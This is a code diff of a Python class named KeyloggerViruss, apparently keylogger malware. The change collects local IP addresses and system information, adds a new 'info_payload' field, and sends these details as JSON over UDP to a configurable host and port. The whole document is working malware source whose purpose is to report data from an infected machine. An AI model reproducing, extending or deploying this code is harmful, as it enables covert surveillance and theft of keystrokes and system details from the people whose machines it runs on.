@@ -13,16 +13,17 @@ import socket
 import json
 import time
 from config import special_keys, IP
-from utils import get_all_local_ips, get_system_info
+from utils import get_all_local_ips, get_system_info, get_info_self_payload
 
 
 class KeyloggerViruss():
     def __init__(self, host: str = "127.0.0.1", port_listen: int = 9998, port_send: int = 9999):
         self.host = host
-        self.ip_self = get_all_local_ips(target_ip=IP)[0]['ip']
-        self.info_self = get_system_info(target_ip=IP)
         self.port_listen = port_listen
         self.port_send = port_send
+        self.ip_self = get_all_local_ips(target_ip=IP)[0]['ip']
+        self.info_self = get_system_info(target_ip=IP)
+        self.info_payload = get_info_self_payload()
         self.FLAG_ACTIVE = False
         self.listener = None
         self.is_active_server = False
@@ -41,6 +42,7 @@ class KeyloggerViruss():
                     "signal": signal,
                     "message": message,
                     "from_ip": self.ip_self,
+                    "info_payload": self.info_payload
                 }
                 sent = sock.sendto(json.dumps(request).encode(), (self.host, self.port_send))
                 print(f"Sent {sent} bytes to {self.host}:{self.port_send}")
